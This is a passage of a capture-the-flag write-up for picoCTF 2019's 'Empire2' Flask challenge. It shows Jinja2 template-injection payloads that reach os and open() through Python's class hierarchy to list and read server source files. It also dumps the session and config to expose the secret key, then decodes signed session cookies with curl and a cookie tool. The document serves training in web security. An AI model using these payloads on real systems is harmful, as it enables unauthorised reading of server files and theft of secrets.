<class 'flask_bootstrap.CDN'>, <class 'flask_bootstrap.StaticCDN'>, <class 'flask_bootstrap.WebCDN'>, <class 'flask_bootstrap.ConditionalCDN'>, <class 'flask_bootstrap.Bootstrap'>, <class 'zipfile.ZipInfo'>, <class 'zipfile._ZipDecrypter'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'pyexpat.xmlparser'>, <class 'plistlib.Data'>, <class 'plistlib._PlistParser'>, <class 'plistlib._DumbXMLWriter'>, <class 'plistlib._BinaryPlistParser'>, <class 'plistlib._BinaryPlistWriter'>, <class 'pkg_resources.extern.VendorImporter'>, <class 'pkg_resources._vendor.six._LazyDescr'>, <class 'pkg_resources._vendor.six._SixMetaPathImporter'>, <class 'pkg_resources._vendor.six._LazyDescr'>, <class 'pkg_resources._vendor.six._SixMetaPathImporter'>, <class 'pkg_resources._vendor.appdirs.AppDirs'>, <class 'pkg_resources.extern.packaging._structures.Infinity'>, <class 'pkg_resources.extern.packaging._structures.NegativeInfinity'>, <class 'pkg_resources.extern.packaging.version._BaseVersion'>, <class 'pkg_resources.extern.packaging.specifiers.BaseSpecifier'>, <class 'pkg_resources._vendor.pyparsing._Constants'>, <class 'pkg_resources._vendor.pyparsing._ParseResultsWithOffset'>, <class 'pkg_resources._vendor.pyparsing.ParseResults'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._FifoCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement'>, <class 'pkg_resources._vendor.pyparsing._NullToken'>, <class 'pkg_resources._vendor.pyparsing.OnlyOnce'>, <class 'pkg_resources._vendor.pyparsing.pyparsing_common'>, <class 'pkg_resources.extern.packaging.markers.Node'>, <class 'pkg_resources.extern.packaging.markers.Marker'>, <class 'pkg_resources.extern.packaging.requirements.Requirement'>, <class 'pkg_resources.IMetadataProvider'>, <class 'pkg_resources.WorkingSet'>, <class 'pkg_resources.Environment'>, <class 'pkg_resources.ResourceManager'>, <class 'pkg_resources.NullProvider'>, <class 'pkg_resources.NoDists'>, <class 'pkg_resources.EntryPoint'>, <class 'pkg_resources.Distribution'>, <class 'six._LazyDescr'>, <class 'six._SixMetaPathImporter'>, <class 'apscheduler.events.SchedulerEvent'>, <class 'apscheduler.executors.base.BaseExecutor'>, <class 'apscheduler.jobstores.base.BaseJobStore'>, <class 'apscheduler.util._Undefined'>, <class 'apscheduler.triggers.base.BaseTrigger'>, <class 'apscheduler.job.Job'>, <class 'apscheduler.schedulers.base.BaseScheduler'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <class 'wtforms.csrf.core.CSRF'>, <class 'flask_wtf.csrf.CSRFProtect'>, <class 'flask_wtf.recaptcha.widgets.RecaptchaWidget'>, <class 'flask_wtf.recaptcha.validators.Recaptcha'>, <class 'sqlalchemy.dialects.sqlite.json._FormatTypeMixin'>, <class 'sqlalchemy.dialects.sqlite.base._DateTimeMixin'>, <class 'sqlite3.Row'>, <class 'sqlite3.Cursor'>, <class 'sqlite3.Connection'>, <class 'sqlite3Node'>, <class 'sqlite3.Cache'>, <class 'sqlite3.Statement'>, <class 'sqlite3.PrepareProtocol'>, <class 'unicodedata.UCD'>]

(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('.')
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('.')}}'

['server.py', 'app', 'xinet_startup.sh']

(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open']('server.py').read()
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open']('server.py').read()}}'

from app import app
if __name__ == '__main__':
    app.run()


(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('app')
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('app')}}'

['templates', 'helpers.py', '__init__.py', 'config.py', 'models.py', 'routes.py']

(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'config.py')).read()
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'config.py')).read()}}'


import os

basedir = os.path.abspath(os.path.dirname(__file__))

class Config(object):
    SECRET_KEY = 'picoCTF{your_flag_is_in_another_castle12345678}'
    SQLALCHEMY_DATABASE_URI = 'sqlite://'
    #SQLALCHEMY_DATABASE_URI = os.environ.get('DATABSE_URL') or 'sqlite:///'+os.path.join(basedir,'app.db')
    SQLALCHEMY_TRACK_MODIFICATIONS = False

(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read()
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read()}}'

from flask import Flask
from app.config import Config
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
from flask_bootstrap import Bootstrap
import time,atexit
from apscheduler.schedulers.background import BackgroundScheduler

app = Flask(__name__)
app.config.from_object(Config)
db = SQLAlchemy(app)
login = LoginManager(app)
login.login_view = 'login'
bootstrap=Bootstrap(app)

from app import routes,models

def DB_init(db):
    db.drop_all()
    db.create_all()

    u = models.User(username='jarrett.booz',password_hash='deadbeef',id=1,admin=0,secret='Likes Oreos.', name="Jarrett Booz")
    db.session.add(u)

    u = models.User(username='danny.tunitis',password_hash='deadbeef',id=2,admin=0,secret='Know it all.', name= "Danny Tunitis")
    db.session.add(u)

    c = models.Todo(item='Shrink the moon', user_id=1)
    db.session.add(c)

    c = models.Todo(item='Grab the moon', user_id=1)
    db.session.add(c)

    c = models.Todo(item='Sit on the toilet', user_id=1)
    db.session.add(c)

    db.session.commit()

try:
    DB_init(db)
    scheduler = BackgroundScheduler()
    scheduler.add_job(func=DB_init,args=(db,),trigger="interval",hours=2)
    scheduler.start()
    atexit.register(lambda: scheduler.shutdown())
except Exception as e:
    print(e)

(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'models.py')).read()
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'models.py')).read()}}'

from app import db,login
from werkzeug.security import generate_password_hash,check_password_hash
from flask_login import UserMixin

@login.user_loader
def load_user(id):
    return User.query.get(int(id))

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64),index=True,unique=True)
    name = db.Column(db.String(128))
    password_hash = db.Column(db.String(128))
    secret = db.Column(db.String(128),default="picoCTF{its_a_me_your_flag5c0e0ae8}")
    admin = db.Column(db.Integer,default=0)

    def set_password(self,password):
        self.password_hash = generate_password_hash(password)

    def check_password(self,password):
        return check_password_hash(self.password_hash,password)

    def __repr__(self):
        return '<User {}>'.format(self.username)


class Todo(db.Model):
    id = db.Column(db.Integer,primary_key=True)
    item = db.Column(db.String(256))
    user_id = db.Column(db.Integer,db.ForeignKey('user.id'))

    def __repr__(self):
        return '<Todo {}>'.format(self.id)


```

We can see that the flag is located in the source of `models.py`: `picoCTF{its_a_me_your_flag5c0e0ae8}`. Since it is inserted into the DB, this might be an unintended solution.

## Additional Solutions

Two more ways to solve the challenge, based on other writeups:

#### Session

The flag is in the user session ([source](https://github.com/roothuntervn/CTF-Writeup/blob/e85042ca05eede0591841c8da6e3f4af2f0b47a3/picoCTF-2019/Web/empire-2/README.md)):

```console
root@kali:/media/sf_CTFs/pico/Empire2# python shell.py
Logged in
(Cmd) send session
Sending: '{{session}}'

<SecureCookieSession {'_fresh': True, '_id': '3898c6835dcd0270702e6730af6bfe5706c798e5239b48c704db909659fbfba4610afd8be05b0a827eda02cb65fe7dc75a2f84325654bddbbbc922a3c5e4f79d', 'csrf_token': '4eff1dd062289b5e4144c3a136d6516ac2430ad9', 'dark_secret': 'picoCTF{its_a_me_your_flag5c0e0ae8}', 'user_id': '3'}>

(Cmd)
```

#### Flask Cookie

We can decode the cookie with the secret key ([source](http://cyberchallenge.unica.it/index.php/2019/10/13/web-empire2/)). This is probably the intended solution.

We dump the config:

```console
root@kali:/media/sf_CTFs/pico/Empire2# python shell.py
Logged in
(Cmd) send config
Sending: '{{config}}'

<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'picoCTF{your_flag_is_in_another_castle12345678}', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None}>
```

The secret key is:
```
'SECRET_KEY': 'picoCTF{your_flag_is_in_another_castle12345678}'
```

Now we fetch the cookie:

```console
root@kali:/media/sf_CTFs/pico/Empire2# curl "https://2019shell1.picoctf.com/problem/13253/login" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s -v --data "csrf_token=$(curl "https://2019shell1.picoctf.com/problem/13253/login" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s | grep csrf | awk '{ printf $5 }' | sed 's/value="//g' | sed 's/">//')&username=user&password=password" 2>&1 | grep Cookie
> Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiZDU1MzkwODhkZGNhY2Y4NmZmZDYzYjJlNWIyZTJkMWVhOGM3YjUxNiJ9.XaWvuQ.O3jA4KKsTj0ZUrOcDxKxY29EIng
< Vary: Cookie
< Set-Cookie: session=.eJwljzlqA0EUBe_SsYJe_qrLiP4bNgYbZqTI-O4acPDCour9tkcdeX60-_N45a09PqPdm0KV7kWJyMEbnDNCycmhVKX3jh25g1lZmuCetFXZcuiMwQTTRPrwpZGFq88xEFYIb9YSJQAunZgbFJzQISZOBzaiUWC73ZqfRz2eP1_5ffUE4tIuEuHbS6gqaNlMvHYJc4uz4aCLe515_J9Y7e8NdkY-9w.XaWvvA.J1ZL5OMpkoGhBUIwKwNMh0Qxj_w; HttpOnly; Path=/
```

And try to decode it with [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager):

```console
root@kali:/media/sf_CTFs/pico/Empire2# c=.eJwljzlqA0EUBe_SsYJe_qrLiP4bNgYbZqTI-O4acPDCour9tkcdeX60-_N45a09PqPdm0KV7kWJyMEbnDNCycmhVKX3jh25g1lZmuCetFXZcuiMwQTTRPrwpZGFq88xEFYIb9YSJQAunZgbFJzQISZOBzaiUWC73ZqfRz2eP1_5ffUE4tIuEuHbS6gqaNlMvHYJc4uz4aCLe515_J9Y7e8NdkY-9w.XaWvvA.J1ZL5OMpkoGhBUIwKwNMh0Qxj_w
root@kali:/media/sf_CTFs/pico/Empire2# python ~/utils/flask-session-cookie-manager/flask_session_cookie_manager2.py decode -s 'picoCTF{your_flag_is_in_another_castle12345678}' -c "$c"
{u'csrf_token': u'd5539088ddcacf86ffd63b2e5b2e2d1ea8c7b516', u'_fresh': True, u'user_id': u'3', u'_id': u'94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba'}
```

No flag yet. We try to add an item and then decode the new cookie:
```console
root@kali:/media/sf_CTFs/pico/Empire2# curl "https://2019shell1.picoctf.com/problem/13253/add_item" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s -v --data "csrf_token=$(curl "https://2019shell1.picoctf.com/problem/13253/add_item" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s | grep csrf | awk '{ printf $5 }' | sed 's/value="//g' | sed 's/">//')&item=test" 2>&1 | grep Cookie
> Cookie: session=.eJwljzlqA0EUBe_SsYJe_qrLiP4bNgYbZqTI-O4acPDCour9tkcdeX60-_N45a09PqPdm0KV7kWJyMEbnDNCycmhVKX3jh25g1lZmuCetFXZcuiMwQTTRPrwpZGFq88xEFYIb9YSJQAunZgbFJzQISZOBzaiUWC73ZqfRz2eP1_5ffUE4tIuEuHbS6gqaNlMvHYJc4uz4aCLe515_J9Y7e8NdkY-9w.XaWvvA.J1ZL5OMpkoGhBUIwKwNMh0Qxj_w
< Vary: Cookie
< Set-Cookie: session=.eJwlT0tqQzEQu0rwOgt_Zsae7LrsGUoI9nya0iaF55dVyN1r6EIIgYSkZ7j4T59Xm-H08QyHfVG42Zz908IxvO92O7ypmobz63xc5s3mNZz27WFLfWk4BQZ37oUMsWrtINVUmYQEnLnFGDFijTCGDxsNe6bOXIclzpoqQR6txSSF1RxLzCkhFG21V_bGBFCdM1oHBiEU0IxZoA6i5DD6milz88v--233tUcRC8fWVKWLN3JXKiMbLqxC603qwEQr95i2_Z8o4fUHY_tNeg.XaWweA.GMksoJhXdbLCFk4pNRiOwzFa-J8; HttpOnly; Path=/
root@kali:/media/sf_CTFs/pico/Empire2# c=.eJwlT0tqQzEQu0rwOgt_Zsae7LrsGUoI9nya0iaF55dVyN1r6EIIgYSkZ7j4T59Xm-H08QyHfVG42Zz908IxvO92O7ypmobz63xc5s3mNZz27WFLfWk4BQZ37oUMsWrtINVUmYQEnLnFGDFijTCGDxsNe6bOXIclzpoqQR6txSSF1RxLzCkhFG21V_bGBFCdM1oHBiEU0IxZoA6i5DD6milz88v--233tUcRC8fWVKWLN3JXKiMbLqxC603qwEQr95i2_Z8o4fUHY_tNeg.XaWweA.GMksoJhXdbLCFk4pNRiOwzFa-J8
root@kali:/media/sf_CTFs/pico/Empire2# python ~/utils/flask-session-cookie-manager/flask_session_cookie_manager2.py decode -s 'picoCTF{your_flag_is_in_another_castle12345678}' -c "$c"
{u'_id': u'94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba', u'_fresh': True, u'user_id': u'3', u'csrf_token': u'd5539088ddcacf86ffd63b2e5b2e2d1ea8c7b516', u'_flashes': [(u'message', u'Item Added')]}
```

No cookie yet. Maybe we need to list the items?

```console
root@kali:/media/sf_CTFs/pico/Empire2# curl "https://2019shell1.picoctf.com/problem/13253/list_items" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s -v 2>&1 | grep Cookie
> Cookie: session=.eJwlT0tqQzEQu0rwOgt_Zsae7LrsGUoI9nya0iaF55dVyN1r6EIIgYSkZ7j4T59Xm-H08QyHfVG42Zz908IxvO92O7ypmobz63xc5s3mNZz27WFLfWk4BQZ37oUMsWrtINVUmYQEnLnFGDFijTCGDxsNe6bOXIclzpoqQR6txSSF1RxLzCkhFG21V_bGBFCdM1oHBiEU0IxZoA6i5DD6milz88v--233tUcRC8fWVKWLN3JXKiMbLqxC603qwEQr95i2_Z8o4fUHY_tNeg.XaWweA.GMksoJhXdbLCFk4pNRiOwzFa-J8
< Vary: Cookie
< Set-Cookie: session=.eJwlkL1qQzEMhV8leM7gP9lWtlIodO9WwkWW5CQkaYp9M5SQd69LB3EQnA-do4dZ2oXGUYfZfT7MZp1irjoGHdRszfuq182LiIrZP_fbae46jma39rvO7SRmZzC2hhSSAmTJFDmrCCZOHBtisdaChWxjra1qLUA-EWKu6tCLyyn6Wop1HFC0QbDeOYhBSqaMrWCKMTf0oBQxcgKO4sFzzDUl12KlGZNHb8t6O-vXzCMAAW0pIkzcSmpNUqheYc48qFQ4V3BpckL9vAzlrrO3-T7x7fXj7XFax0LLVZef273_vecAbNWSludk7kP7f_Fgnr8_qWAy.XaWwzw.3uQye2Z-VwJiYXfe6SBN2DGivGU; HttpOnly; Path=/
root@kali:/media/sf_CTFs/pico/Empire2# c=.eJwlkL1qQzEMhV8leM7gP9lWtlIodO9WwkWW5CQkaYp9M5SQd69LB3EQnA-do4dZ2oXGUYfZfT7MZp1irjoGHdRszfuq182LiIrZP_fbae46jma39rvO7SRmZzC2hhSSAmTJFDmrCCZOHBtisdaChWxjra1qLUA-EWKu6tCLyyn6Wop1HFC0QbDeOYhBSqaMrWCKMTf0oBQxcgKO4sFzzDUl12KlGZNHb8t6O-vXzCMAAW0pIkzcSmpNUqheYc48qFQ4V3BpckL9vAzlrrO3-T7x7fXj7XFax0LLVZef273_vecAbNWSludk7kP7f_Fgnr8_qWAy.XaWwzw.3uQye2Z-VwJiYXfe6SBN2DGivGU
root@kali:/media/sf_CTFs/pico/Empire2# python ~/utils/flask-session-cookie-manager/flask_session_cookie_manager2.py decode -s 'picoCTF{your_flag_is_in_another_castle12345678}' -c "$c"
{u'csrf_token': u'd5539088ddcacf86ffd63b2e5b2e2d1ea8c7b516', u'user_id': u'3', u'_flashes': [(u'message', u'Item Added')], u'_fresh': True, u'dark_secret': u'picoCTF{its_a_me_your_flag5c0e0ae8}', u'_id': u'94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba'}
```

We can finally see the flag using this method. Template injection was much easier :-)